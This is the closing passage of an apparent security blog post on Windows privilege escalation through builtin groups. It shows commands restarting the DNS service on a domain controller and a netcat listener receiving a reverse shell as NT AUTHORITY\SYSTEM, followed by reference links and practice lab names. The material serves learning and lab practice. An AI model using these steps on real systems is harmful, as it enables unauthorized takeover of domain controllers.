+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; sc.exe \\&lt;DC&gt; stop dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns </span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : 3  STOP_PENDING </span><br><span class="line">                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; sc.exe \\&lt;DC&gt; start dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns </span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : 2  START_PENDING </span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x7d0</span><br><span class="line">        PID                : 3500</span><br><span class="line">        FLAGS</span><br></pre></td></tr></table></figure>
+<figure class="highlight terminal plaintext"><table><tr><td class="code"><pre><span class="line cmd"><span class="prompt">$ </span>rlwrap nc -nlvp 9001</span><br><span class="line out"></span><br><span class="line out">...</span><br><span class="line out"></span><br><span class="line out">&gt; whoami</span><br><span class="line out">nt authority\system</span><br></pre></td></tr></table></figure>
+<h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://x.com/fr0gger_/status/1379465943965909000">https://x.com/fr0gger_/status/1379465943965909000</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/k4sth4/SeLoadDriverPrivilege">https://github.com/k4sth4/SeLoadDriverPrivilege</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</a></li>
+<li><a target="_blank" rel="noopener" href="https://x.com/splinter_code/status/1568548572861267968">https://x.com/splinter_code/status/1568548572861267968</a></li>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178">https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178</a></li>
+<li><a target="_blank" rel="noopener" href="https://snowscan.io/htb-writeup-blackfield/">https://snowscan.io/htb-writeup-blackfield/</a></li>
+<li><a target="_blank" rel="noopener" href="https://snowscan.io/htb-writeup-resolute/">https://snowscan.io/htb-writeup-resolute/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/a-d/movement/domain-settings/builtin-groups">https://www.thehacker.recipes/a-d/movement/domain-settings/builtin-groups</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/builtins/security-groups">https://www.thehacker.recipes/ad/movement/builtins/security-groups</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise</a></li>
+<li><a target="_blank" rel="noopener" href="https://web.archive.org/web/20230129100526/https://cube0x0.github.io/Pocing-Beyond-DA/">https://web.archive.org/web/20230129100526/https://cube0x0.github.io/Pocing-Beyond-DA/</a></li>
+<li><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2024/06/08/htb-pov.html#exploit-sedebug">https://0xdf.gitlab.io/2024/06/08/htb-pov.html#exploit-sedebug</a></li>
+</ul>
+<h2 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h2><ul>
+<li>Baby</li>
+<li>Blackfield</li>
+<li>Resolute</li>
+<li>Fuse</li>
+<li>POV</li>
+<li>Job</li>
+<li>Sidecar</li>
+</ul>
+
+    </div>
+  </div>
+
+  <footer class="post-foot">
+    
+    <div class="tool">
+      <p class="call"><b>Search</b>(related: "Windows-Privesc.md")</p>
+      <p class="result">Found 3 posts</p>
+      <ul class="list">
+        
+        <li><time datetime="2023-10-25T12:19:27.000Z">2023-10-25</time><a href="/claude/Job-Vulnlab/">Job - Vulnlab</a></li>
+        
+        <li><time datetime="2023-10-19T18:08:57.000Z">2023-10-19</time><a href="/claude/Media-Vulnlab/">Media - Vulnlab</a></li>
+        
+        <li><time datetime="2025-02-15T13:54:52.000Z">2025-02-15</time><a href="/claude/HTB-Solving-Cicada-Using-Only-NetExec/">HTB: Solving Cicada Using Only NetExec</a></li>
+        
+      </ul>
+    </div>
+    
+    
+    <nav class="neighbors" aria-label="more posts">
+      <a class="older" href="/claude/RBCD-Notes/" rel="next"><small>← older</small>Abusing Resource-Based Constrained Delegation</a>
+      <a class="newer" href="/claude/Reflection-Vulnlab/" rel="prev"><small>newer →</small>Reflection - Vulnlab</a>
+    </nav>
+    
+  </footer>
+</article>
+
+</main>
+<footer class="site-footer wrap">
+  
+  <p><span class="spark" aria-hidden="true">✻</span> © 2023–2026 serioton · <a href="/claude/atom.xml">rss</a></p>
+</footer>
+
+
+<div class="bar" data-index="/claude/search.xml">
+  <div class="wrap">
+    <div class="ask">
+      <div class="panel" hidden>
+        <div class="panel-head"></div>
+        <ol class="panel-list" role="listbox" aria-label="results"></ol>
+        <p class="panel-note" aria-live="polite"></p>
+      </div>
+      <label class="input">
+        <span aria-hidden="true">&gt;</span>
+        <input type="text" placeholder='Try "kerberos" or /help' autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="search posts or type a command">
+      </label>
+    </div>
+    <div class="status">
+      <button type="button" class="mode" data-mode-cycle title="shift+tab to cycle modes"><span data-mode-label>? for shortcuts</span></button>
+      <span class="status-right">
+        <button type="button" data-run="model" title="/model"><span data-model>Mythos 5.2</span></button>
+        <button type="button" data-run="effort" title="/effort"><span data-effort>high</span><span class="ctx-word"> effort</span></button>
+        <button type="button" class="ctx" data-run="context" title="/context"><span class="meter" aria-hidden="true"><i></i></span><span data-ctx>0%</span><span class="ctx-word"> context</span></button>
+      </span>
+    </div>
+  </div>
+  <script type="application/json" class="commands">[{"name":"/home","hint":"list all posts","url":"/claude/"},{"name":"/archives","hint":"open archives","url":"/claude/archives/"},{"name":"/categories","hint":"open categories","url":"/claude/categories/"},{"name":"/tags","hint":"open tags","url":"/claude/tags/"},{"name":"/about","hint":"open about","url":"/claude/about/"},{"name":"/rss","hint":"subscribe to the feed","url":"/claude/atom.xml"},{"name":"/resume","hint":"go back to a post you were reading","run":"resume"},{"name":"/random","hint":"read a random post","run":"random"},{"name":"/context","hint":"how much of the context window this page takes","run":"context"},{"name":"/compact","hint":"hide command output in code blocks, or bring it back","run":"compact"},{"name":"/model","hint":"pick the model shown in the status line","run":"model"},{"name":"/effort","hint":"set how hard the model thinks","run":"effort"},{"name":"/permissions","hint":"sites you allowed links to open without asking","run":"permissions"},{"name":"/status","hint":"current model, mode and setup","run":"status"},{"name":"/theme","hint":"switch between light and dark","run":"theme"},{"name":"/butterfly","hint":"switch the blog to the Butterfly theme","url":"/?theme=butterfly"},{"name":"/loaf","hint":"switch the blog to the Loaf theme","url":"/loaf/?theme=loaf"},{"name":"/export","hint":"print this page or save it as a PDF","run":"export"},{"name":"/clear","hint":"reset the mode, filters and prompt","run":"clear"},{"name":"/top","hint":"scroll to the top","run":"top"},{"name":"/help","hint":"list commands and shortcuts","run":"help"}]</script><script>(function(){var s=document.currentScript.previousElementSibling,T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},root="/claude/",p=location.pathname,rel=p.indexOf(root)===0?p.slice(root.length):"";try{var c=JSON.parse(s.textContent);c.forEach(function(x){var m=/\?theme=([\w-]+)$/.exec(x.url||"");if(m&&T[m[1]]!==undefined)x.url=T[m[1]]+rel+"?theme="+m[1]});s.textContent=JSON.stringify(c)}catch(e){}})()</script>
+  <script type="application/json" class="session">{"models":[{"name":"Mythos 5.2","id":"claude-mythos-5-2","hint":"most capable"},{"name":"Fable 5.2","id":"claude-fable-5-2","hint":"most capable, with added safeguards"},{"name":"Opus 5.5","id":"claude-opus-5-5","hint":"for complex work"},{"name":"Sonnet 5.5","id":"claude-sonnet-5-5","hint":"best for everyday tasks"},{"name":"Haiku 5.5","id":"claude-haiku-5-5","hint":"fastest"}],"window":200000,"permissions":true,"posts":26}</script>
+</div>
+
+<script src="/claude/js/claude.js" defer></script>
+<script>(function(){var T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},here="claude",root=T[here],p=location.pathname;var rel=p.indexOf(root)===0?p.slice(root.length):"";for(var k in T){if(k!==here&&T[k].length>root.length&&p.indexOf(T[k])===0)rel=""}var links=document.querySelectorAll("a[data-switch]");function place(){if(scrollY<200)return"";var h=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]"),id="";for(var i=0;i<h.length;i++){if(h[i].getBoundingClientRect().top<160)id=h[i].id;else break}return id?"#"+encodeURIComponent(id):""}function url(a){return T[a.dataset.switch]+rel+"?theme="+a.dataset.switch}function warm(a){if(a.dataset.warm)return;a.dataset.warm=1;var l=document.createElement("link");l.rel="prefetch";l.href=url(a);document.head.appendChild(l)}links.forEach(function(a){a.href=url(a);a.addEventListener("pointerenter",function(){warm(a)});a.addEventListener("focus",function(){warm(a)});a.addEventListener("touchstart",function(){warm(a)},{passive:true});a.addEventListener("click",function(){try{localStorage.setItem("blog-theme",a.dataset.switch)}catch(e){}var st=document.createElement("style");st.textContent="@view-transition{navigation:auto}";document.head.appendChild(st);a.href=url(a)+place()})});document.querySelectorAll("details.tsw").forEach(function(d){d.addEventListener("toggle",function(){if(d.open)links.forEach(warm)});document.addEventListener("click",function(e){if(d.open&&!d.contains(e.target))d.open=false});document.addEventListener("keydown",function(e){if(e.key==="Escape")d.open=false})});})()</script></body>
+</html>
